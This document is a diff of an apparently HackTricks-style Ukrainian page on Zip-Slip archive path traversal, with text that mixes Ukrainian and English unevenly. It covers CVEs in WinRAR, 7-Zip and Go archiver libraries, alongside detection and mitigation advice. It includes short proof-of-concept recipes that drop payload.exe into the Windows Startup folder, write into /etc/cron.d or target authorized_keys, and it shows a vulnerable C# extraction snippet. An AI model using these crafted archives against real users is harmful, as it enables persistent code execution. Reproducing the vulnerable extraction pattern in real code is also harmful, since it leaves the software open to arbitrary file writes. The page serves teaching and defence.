@@ -4,97 +4,117 @@
 
 ## Огляд
 
-Багато форматів архівів (ZIP, RAR, TAR, 7-ZIP тощо) дозволяють кожному запису містити власний **внутрішній шлях**. Коли утиліта для розпакування сліпо довіряє цьому шляху, створене ім'я файлу, що містить `..` або **абсолютний шлях** (наприклад `C:\Windows\System32\`), буде записано поза обраним користувачем каталогом.
-Цей клас уразливостей широко відомий як *Zip-Slip* або **archive extraction path traversal**.
+Багато форматів архівів (ZIP, RAR, TAR, 7-ZIP тощо) дозволяють кожному запису мати власний **внутрішній шлях**. Коли утиліта для розпакування бездумно поважає цей шлях, спеціально сформоване ім'я файлу, що містить `..` або **абсолютний шлях** (наприклад `C:\Windows\System32\`), буде записано за межами обраного користувачем каталогу.
+Цей клас вразливостей широко відомий як *Zip-Slip* або **archive extraction path traversal**.
 
-## Наслідки
+Наслідки можуть варіюватися від перезапису довільних файлів до безпосереднього досягнення **remote code execution (RCE)** шляхом розміщення payload в **auto-run** місці, наприклад у папці Windows *Startup*.
 
-Наслідки варіюються від перезапису довільних файлів до прямого досягнення **remote code execution (RCE)** шляхом розміщення payload у **auto-run** місці, наприклад у Windows *Startup* folder.
+## Корінь проблеми
 
-## Коренева причина
-
-1. Атакуючий створює архів, де один або кілька заголовків файлів містять:
-* Відносні послідовності обходу (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
+1. Зловмисник створює архів, у якому один або кілька заголовків файлів містять:
+* Відносні послідовності переходу (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
 * Абсолютні шляхи (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
-* Або спеціально створені **symlinks**, що вказують за межі цільового каталогу (поширено в ZIP/TAR на *nix*).
-2. Жертва розпаковує архів за допомогою вразливого інструменту, який довіряє вбудованому шляху (або слідує за symlinks), замість того щоб перевірити його або примусово виконати розпакування всередині обраного каталогу.
-3. Файл записується у розташування, контрольоване атакуючим, і виконується/завантажується при наступному тригері цього шляху системою чи користувачем.
+* Або спеціально створені **symlinks**, які вказують за межі цільового каталогу (поширено в ZIP/TAR на *nix*).
+2. Жертва розпаковує архів за допомогою вразливого інструменту, який довіряє вбудованому шляху (або слідує за symlinks) замість того, щоб нормалізувати його або примусово обмежити розпакування під обраним каталогом.
+3. Файл записується в розташування під контролем зловмисника і буде виконаний/завантажений наступного разу, коли система або користувач звернеться до цього шляху.
+
+### .NET `Path.Combine` + `ZipArchive` traversal
+```csharp
+using (var zip = ZipFile.OpenRead(zipPath))
+{
+foreach (var entry in zip.Entries)
+{
+var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
+entry.ExtractToFile(dest);
+}
+}
+```
+- Якщо `entry.FullName` починається з `..\\` it traverses; якщо це є **absolute path** ліва компонента відкидається повністю, що призводить до **arbitrary file write** як extraction identity.
+- Архів proof-of-concept для запису в суміжну директорію `app`, яку відслідковує плановий сканер:
+```python
+import zipfile
+with zipfile.ZipFile("slip.zip", "w") as z:
+z.writestr("../app/0xdf.txt", "ABCD")
+```
+Кинувши цей ZIP у моніторовану вхідну скриньку, отримаємо `C:\samples\app\0xdf.txt`, що підтверджує traversal поза `C:\samples\queue\` і дозволяє follow-on primitives (наприклад, DLL hijacks).
 
 ## Реальний приклад – WinRAR ≤ 7.12 (CVE-2025-8088)
 
-WinRAR для Windows (включаючи `rar` / `unrar` CLI, DLL та портативне джерело) не перевіряв імена файлів під час розпакування.
+WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) не перевіряв імена файлів під час розпакування.
 Зловмисний RAR-архів, що містить запис на кшталт:
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-опинилися б **поза** вибраною директорією виводу та в папці *Startup* користувача. Після входу в систему Windows автоматично виконує все, що там присутнє, забезпечуючи *постійний* RCE.
+в результаті опиниться **поза** обраним каталогом виведення та у папці *Startup* користувача. Після входу в систему Windows автоматично виконує все, що там присутнє, забезпечуючи *постійний* RCE.
 
-### Crafting a PoC Archive (Linux/Mac)
+### Створення PoC-архіву (Linux/Mac)
 ```bash
 # Requires rar >= 6.x
 mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 rar a -ep evil.rar evil/*
 ```
-Використані опції:
-* `-ep`  – зберігати шляхи файлів точно як задано (не обрізувати ведучий `./`).
+Options used:
+* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).
 
-Передайте `evil.rar` жертві та інструктуйте її розпакувати його за допомогою вразливої збірки WinRAR.
+Доставте `evil.rar` жертві та інструктуйте її розпакувати його за допомогою вразливої збірки WinRAR.
 
-### Виявлені експлуатації в реальному житті
+### Observed Exploitation in the Wild
 
-ESET повідомила про RomCom (Storm-0978/UNC2596) spear-phishing кампанії, які додавали RAR-архіви, що зловживали CVE-2025-8088 для розгортання customised backdoors та сприяння ransomware операціям.
+ESET повідомила про spear-phishing кампанії RomCom (Storm-0978/UNC2596), які додавали RAR-архіви з використанням CVE-2025-8088 для розгортання кастомізованих backdoor та сприяння операціям ransomware.
 
-## Новіші випадки (2024–2025)
+## Newer Cases (2024–2025)
 
 ### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
-* **Помилка**: записи ZIP, що є **символьними посиланнями**, розпізнавалися під час розпакування, дозволяючи зловмисникам вийти за межі директорії призначення та перезаписати довільні шляхи. Взаємодія користувача — лише *відкриття/розпакування* архіву.
-* **Постраждалі**: 7-Zip 21.02–24.09 (Windows & Linux збірки). Виправлено в **25.00** (липень 2025) і пізніших версіях.
-* **Шлях впливу**: перезапис `Start Menu/Programs/Startup` або місць запуску сервісів → код виконається при наступному вході або перезапуску сервісу.
-* **Швидкий PoC (Linux)**:
+* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
+* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
+* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
+* **Quick PoC (Linux)**:
 ```bash
 mkdir -p out
 ln -s /etc/cron.d evil
 zip -y exploit.zip evil   # -y preserves symlinks
 7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
 ```
-На виправленій збірці `/etc/cron.d` не буде змінено; символьне посилання буде витягнуто як посилання всередині /tmp/target.
+On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.
 
 ### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
-* **Помилка**: `archiver.Unarchive()` слідує за `../` та символьними посиланнями в ZIP-записах, записуючи за межі `outputDir`.
-* **Постраждалі**: `github.com/mholt/archiver` ≤ 3.5.1 (проект тепер застарілий).
-* **Виправлення**: Перейти на `mholt/archives` ≥ 0.1.0 або реалізувати перевірки канонічного шляху перед записом.
-* **Мінімальна репродукція**:
+* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
+* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
+* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
+* **Minimal reproduction**:
 ```go
 // go test . with archiver<=3.5.1
 archiver.Unarchive("exploit.zip", "/tmp/safe")
 // exploit.zip holds ../../../../home/user/.ssh/authorized_keys
 ```
 
-## Поради з виявлення
+## Detection Tips
 
-* **Статичний огляд** – Перелікуйте записи архіву і позначайте будь-які імена, що містять `../`, `..\\`, *absolute paths* (`/`, `C:`) або записи типу *symlink*, чиї цілі знаходяться поза директорією розпакування.
-* **Канонізація** – Переконайтеся, що `realpath(join(dest, name))` все ще починається з `dest`. Відхиляйте інакше.
-* **Розпакування в пісочниці** – Розархівовуйте в тимчасову директорію за допомогою *безпечного* екстрактора (наприклад, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) і перевіряйте, що отримані шляхи залишаються всередині цієї директорії.
-* **Моніторинг кінцевих точок** – Сигналізуйте про нові виконувані файли, записані в `Startup`/`Run`/`cron` місця незабаром після того, як архів було відкрито WinRAR/7-Zip/тощо.
+* **Static inspection** – Перелічуйте записи архіву та позначайте будь-які імена, що містять `../`, `..\\`, *absolute paths* (`/`, `C:`) або записи типу *symlink*, ціль яких лежить за межами каталогу розпакування.
+* **Canonicalisation** – Переконайтеся, що `realpath(join(dest, name))` все ще починається з `dest`. Відхиляйте інакше.
+* **Sandbox extraction** – Розпаковуйте в тимчасовий каталог за допомогою *безпечного* екстрактора (наприклад, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) і перевіряйте, що отримані шляхи залишаються всередині каталогу.
+* **Endpoint monitoring** – Сигналізуйте про нові виконувані файли, записані до `Startup`/`Run`/`cron` локацій незабаром після відкриття архіву WinRAR/7-Zip/тощо.
 
-## Пом'якшення ризику та закріплення захисту
+## Mitigation & Hardening
 
-1. **Оновіть екстрактор** – WinRAR 7.13+ та 7-Zip 25.00+ реалізують санітизацію шляхів/символьних посилань. Обидва інструменти все ще не мають автооновлення.
-2. Розпаковуйте архіви з опцією “**Do not extract paths**” / “**Ignore paths**”, коли це можливо.
-3. На Unix знижуйте привілеї та монтуйте **chroot/namespace** перед розпакуванням; на Windows використовуйте **AppContainer** або пісочницю.
-4. Якщо пишете власний код, нормалізуйте за допомогою `realpath()`/`PathCanonicalize()` **перед** створенням/записом і відкидайте будь-який запис, що втікає за межі призначення.
+1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+ implement path/symlink sanitisation. Both tools still lack auto-update.
+2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
+3. On Unix, drop privileges & mount a **chroot/namespace** before extraction; on Windows, use **AppContainer** or a sandbox.
+4. If writing custom code, normalise with `realpath()`/`PathCanonicalize()` **before** create/write, and reject any entry that escapes the destination.
 
-## Додаткові постраждалі / історичні випадки
+## Additional Affected / Historical Cases
 
-* 2018 – Масивне повідомлення про *Zip-Slip* від Snyk, що вплинуло на багато бібліотек Java/Go/JS.
-* 2023 – 7-Zip CVE-2023-4011, схоже проходження під час злиття `-ao`.
-* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal у slugs (патч у v1.2).
-* Будь-яка власна логіка розпакування, яка не викликає `PathCanonicalize` / `realpath` перед записом.
+* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
+* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
+* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
+* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.
 
-## Посилання
+## References
 
 - [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
 - [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
+- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
+- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 {{#include ../banners/hacktricks-training.md}}
